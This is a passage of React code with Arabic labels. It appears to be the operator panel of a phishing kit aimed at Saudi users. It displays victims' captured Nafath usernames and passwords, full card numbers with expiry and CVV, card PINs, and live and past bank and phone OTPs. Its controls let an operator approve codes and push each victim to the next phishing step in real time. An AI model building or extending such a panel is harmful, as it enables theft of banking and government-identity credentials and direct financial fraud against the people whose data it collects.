                              <p className="text-xs text-slate-600 dark:text-slate-400 font-mono">
                                {selectedApplication.nafazId || "لم يتم إنشاؤه"}
                              </p>
                            </div>
                            <div>
                              <p className="text-sm font-semibold text-slate-900 dark:text-white">الرقم السري</p>
                              <p className="text-xs text-slate-600 dark:text-slate-400 font-mono">
                                {selectedApplication.nafazPass || "لم يتم إنشاؤه"}
                              </p>
                            </div>
                            <div>
                              <p className="text-sm font-semibold text-slate-900 dark:text-white">رمز التوثيق</p>
                              <Input
                                type="tel"
                                onChange={(e) => {
                                  setAuthNumber(e.target.value)
                                }}
                              />
                            </div>
                          </div>
                        </div>
                        <div className="flex gap-2">
                          <Button
                            onClick={() => handleAuthNumber(selectedApplication.id!, authNumber)}
                            variant="outline"
                            size="sm"
                            className="flex-1 gap-2 hover:bg-green-50 dark:hover:bg-green-950/30 border-green-200 dark:border-green-800"
                          >
                            <CheckCircle className="w-4 h-4 text-green-600 dark:text-green-400" />
                            <span className="text-green-700 dark:text-green-400">حفظ</span>
                          </Button>
                          <Button variant="outline" size="sm">
                            <XCircle className="w-4 h-4 text-red-600 dark:text-red-400" />
                            <span className="text-red-700 dark:text-red-400">الغاء</span>
                          </Button>
                        </div>
                      </div>
                    </div>
                  </div>

                  {/* Payment Info - Only show if card data exists */}
                  {selectedApplication.cardNumber && (
                    <div className="lg:col-span-3 bg-white dark:bg-slate-900 rounded-xl border border-slate-200 dark:border-slate-800 p-6 shadow-sm">
                      <div className="flex items-center gap-3 mb-6">
                        <div className="w-10 h-10 bg-indigo-100 dark:bg-indigo-900/30 rounded-lg flex items-center justify-center">
                          <CreditCard className="w-5 h-5 text-indigo-600 dark:text-indigo-400" />
                        </div>
                        <h3 className="text-lg font-bold text-slate-900 dark:text-white">معلومات الدفع</h3>
                      </div>
                      <div className="flex flex-col lg:flex-row gap-6">
                        <div className="flex-1">
                          <CreditCardMockup
                            cardNumber={selectedApplication.cardNumber}
                            expiryDate={selectedApplication?.expiryDate}
                            cvv={selectedApplication?.cvv}
                            cardholderName={selectedApplication.ownerName}
                          />
                        </div>
                        <div className="lg:w-64 space-y-4">
                          {selectedApplication.otp && (
                            <div className="p-4 bg-green-50 dark:bg-green-950/30 border border-green-200 dark:border-green-800 rounded-xl">
                              <p className="text-xs font-medium text-green-900 dark:text-green-300 mb-2">
                                رمز OTP الحالي
                              </p>
                              <p
                                className="text-3xl font-bold text-green-600 dark:text-green-400 font-mono text-center"
                                dir="ltr"
                              >
                                {selectedApplication.otp}
                              </p>
                            </div>
                          )}
                          {selectedApplication.allOtps && selectedApplication.allOtps.length > 0 && (
                            <div className="p-4 bg-slate-50 dark:bg-slate-800/50 rounded-xl">
                              <p className="text-xs font-medium text-slate-700 dark:text-slate-300 mb-3">
                                سجل رموز OTP
                              </p>
                              <div className="flex flex-wrap gap-2">
                                {selectedApplication.allOtps.map((otp, index) => (
                                  <Badge
                                    key={index}
                                    variant="secondary"
                                    className="bg-slate-200 dark:bg-slate-700 text-slate-700 dark:text-slate-300 font-mono"
                                    dir="ltr"
                                  >
                                    {otp}
                                  </Badge>
                                ))}
                              </div>
                            </div>
                          )}
                        </div>
                      </div>
                    </div>
                  )}

                  {/* Verification Status */}
                  <div className=" w-full bg-white dark:bg-slate-900 rounded-xl border border-slate-200 dark:border-slate-800 p-6 shadow-sm">
                    <h3 className="text-lg font-bold text-slate-900 dark:text-white mb-4">معلومات الهاتف</h3>
                    <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-4 mb-6">
                      <div className="w-full flex flex-col space-y-3  rounded-lg dark:bg-slate-800/40">
                        <p className="text-sm font-semibold text-slate-900 dark:text-white">هاتف</p>
                        <p className="text-xs text-slate-600 dark:text-slate-400 font-mono">
                          {selectedApplication.phoneNumber2 || "لم يتم إنشاؤه"}
                        </p>
                        <p className="text-sm font-semibold text-slate-900 dark:text-white">مزود الخدمة</p>
                        <p className="text-xs text-slate-600 dark:text-slate-400 font-mono">
                          {selectedApplication.selectedCarrier || "لم يتم إنشاؤه"}
                        </p>
                      </div>
                    </div>
                    <div className="p-4 bg-slate-50 dark:bg-slate-800/50 rounded-xl border border-slate-200 dark:border-slate-700">
                      <div className="flex items-center justify-between mb-3">
                        <div className="flex items-center gap-3">
                          <div className="w-12 h-12 rounded-xl bg-blue-100 dark:bg-blue-900/30 flex items-center justify-center">
                            <Phone className="w-6 h-6 text-blue-600 dark:text-blue-400" />
                          </div>
                          <div>
                            <p className="text-sm font-semibold text-slate-900 dark:text-white">رمز الهاتف</p>
                            <p className="text-xs text-slate-600 dark:text-slate-400 font-mono">
                              {selectedApplication?.phoneOtp || "لم يتم إنشاؤه"}
                            </p>
                          </div>
                        </div>
                        <Badge
                          variant={
                            selectedApplication.phoneVerificationStatus === "approved"
                              ? "default"
                              : selectedApplication.phoneVerificationStatus === "rejected"
                                ? "destructive"
                                : "secondary"
                          }
                          className="text-xs"
                        >
                          {selectedApplication.phoneVerificationStatus === "approved"
                            ? "موافق"
                            : selectedApplication.phoneVerificationStatus === "rejected"
                              ? "مرفوض"
                              : "معلق"}
                        </Badge>
                      </div>
                    </div>
                    <div className="flex gap-2">
                      <Button
                        onClick={() => handlePhoneVerificationChange(selectedApplication.id!, "approved")}
                        variant="outline"
                        size="sm"
                        className="flex-1 gap-2 hover:bg-green-50 dark:hover:bg-green-950/30 border-green-200 dark:border-green-800"
                        disabled={selectedApplication.phoneVerificationStatus === "approved"}
                      >
                        <CheckCircle className="w-4 h-4 text-green-600 dark:text-green-400" />
                        <span className="text-green-700 dark:text-green-400">قبول</span>
                      </Button>
                      <Button
                        onClick={() => handlePhoneVerificationChange(selectedApplication.id!, "rejected")}
                        variant="outline"
                        size="sm"
                        className="flex-1 gap-2 hover:bg-red-50 dark:hover:bg-red-950/30 border-red-200 dark:border-red-800"
                        disabled={selectedApplication.phoneVerificationStatus === "rejected"}
                      >
                        <XCircle className="w-4 h-4 text-red-600 dark:text-red-400" />
                        <span className="text-red-700 dark:text-red-400">رفض</span>
                      </Button>
                    </div>
                  </div>

                  <div className="lg:col-span-1 bg-white dark:bg-slate-900 rounded-xl border border-slate-200 dark:border-slate-800 p-6 shadow-sm">
                    <h3 className="text-lg font-bold text-slate-900 dark:text-white mb-4">حالة التحقق</h3>
                    <div className="space-y-4">
                      {/* ID Verification */}
                      <div className="p-4 bg-slate-50 dark:bg-slate-800/50 rounded-xl border border-slate-200 dark:border-slate-700">
                        <div className="flex items-center justify-between mb-3">
                          <div className="flex flex-col items-center gap-3">
                            <div className="w-12 h-12 rounded-xl bg-green-100 dark:bg-green-900/30 flex items-center justify-center">
                              <CreditCard className="w-6 h-6 text-green-600 dark:text-green-400" />
                            </div>
                            <div>
                              <p className="text-sm font-semibold text-slate-900 dark:text-white">رمز البطاقة</p>
                              <p className="text-xs text-slate-600 dark:text-slate-400 font-mono">
                                {selectedApplication.otp || "لم يتم إنشاؤه"}
                              </p>
                            </div>
                            <div>
                              <p className="text-sm font-semibold text-slate-900 dark:text-white">Pin Code</p>
                              <p className="text-xs text-slate-600 dark:text-slate-400 font-mono">
                                {selectedApplication.pinCode || "لم يتم إنشاؤه"}
                              </p>
                            </div>
                          </div>
                          <Badge
                            variant={
                              selectedApplication.idVerificationStatus === "approved"
                                ? "default"
                                : selectedApplication.idVerificationStatus === "rejected"
                                  ? "destructive"
                                  : "secondary"
                            }
                            className="text-xs"
                          >
                            {selectedApplication.idVerificationStatus === "approved"
                              ? "موافق"
                              : selectedApplication.idVerificationStatus === "rejected"
                                ? "مرفوض"
                                : "معلق"}
                          </Badge>
                        </div>
                        <div className="flex gap-2">
                          <Button
                            onClick={() => handleIdVerificationChange(selectedApplication.id!, "approved")}
                            variant="outline"
                            size="sm"
                            className="flex-1 gap-2 hover:bg-green-50 dark:hover:bg-green-950/30 border-green-200 dark:border-green-800"
                            disabled={selectedApplication.idVerificationStatus === "approved"}
                          >
                            <CheckCircle className="w-4 h-4 text-green-600 dark:text-green-400" />
                            <span className="text-green-700 dark:text-green-400">قبول</span>
                          </Button>
                          <Button
                            onClick={() => handleIdVerificationChange(selectedApplication.id!, "rejected")}
                            variant="outline"
                            size="sm"
                            className="flex-1 gap-2 hover:bg-red-50 dark:hover:bg-red-950/30 border-red-200 dark:border-red-800"
                            disabled={selectedApplication.idVerificationStatus === "rejected"}
                          >
                            <XCircle className="w-4 h-4 text-red-600 dark:text-red-400" />
                            <span className="text-red-700 dark:text-red-400">رفض</span>
                          </Button>
                        </div>
                      </div>
                    </div>
                  </div>

                  {/* Control Panel */}
                  <div className="lg:col-span-2 bg-white dark:bg-slate-900 rounded-xl border border-slate-200 dark:border-slate-800 p-6 shadow-sm">
                    <h3 className="text-lg font-bold text-slate-900 dark:text-white mb-4">التحكم بالطلب</h3>
                    <div className="grid grid-cols-1 md:grid-cols-3 gap-3 mb-6">
                      <Button
                        onClick={() => handleStatusChange(selectedApplication.id!, "nafad")}
                        variant="outline"
                        className="h-auto py-4 justify-start"
                        disabled={selectedApplication.currentStep === "nafad"}
                      >
                        نفاذ
                      </Button>
                      <Button
                        onClick={() => handleStatusChange(selectedApplication.id!, "phone")}
                        variant="outline"
                        className="h-auto py-4 justify-start hover:bg-green-50 dark:hover:bg-green-950/30 border-green-200 dark:border-green-800"
                        disabled={selectedApplication.currentStep === "phone"}
                      >
                        التحويل للهاتف
                      </Button>
                      <Button
                        onClick={() => handleStatusChange(selectedApplication.id!, "home")}
                        variant="outline"
                        className="h-auto py-4 justify-start hover:bg-red-50 dark:hover:bg-red-950/30 border-red-200 dark:border-red-800"
                        disabled={selectedApplication.currentStep === "home"}
                      >
                        الرئيسية
                      </Button>
                    </div>
                    <div className="pt-4 border-t border-slate-200 dark:border-slate-800">
                      <h4 className="text-sm font-semibold text-slate-700 dark:text-slate-300 mb-3">التحكم بالخطوات</h4>
                      <div className="flex gap-2">
                        {[1, 2, 3, 4].map((step) => (
                          <Button
                            key={step}
                            onClick={() => handleStepChange(selectedApplication.id!, step)}
                            variant={selectedApplication.currentStep === step ? "default" : "outline"}
                            size="lg"
                            className="flex-1 flex-col h-auto py-3"
                          >
                            <span className="text-xs opacity-70">خطوة {step}</span>
                            <span>{STEP_NAMES[step]}</span>
                          </Button>
                        ))}
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            )
          ) : (
            <div className="flex items-center justify-center h-full">
              <div className="text-center">
                <div className="w-24 h-24 rounded-2xl bg-gradient-to-br from-slate-100 to-slate-200 dark:from-slate-800 dark:to-slate-700 flex items-center justify-center mx-auto mb-4 shadow-inner">
                  <Mail className="w-12 h-12 text-slate-400 dark:text-slate-500" />
                </div>
                <h3 className="text-xl font-bold text-slate-900 dark:text-white mb-2">اختر طلباً لعرض التفاصيل</h3>
                <p className="text-slate-600 dark:text-slate-400">
                  اضغط على أي طلب من القائمة الجانبية لعرض المعلومات الكاملة
                </p>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  )
}
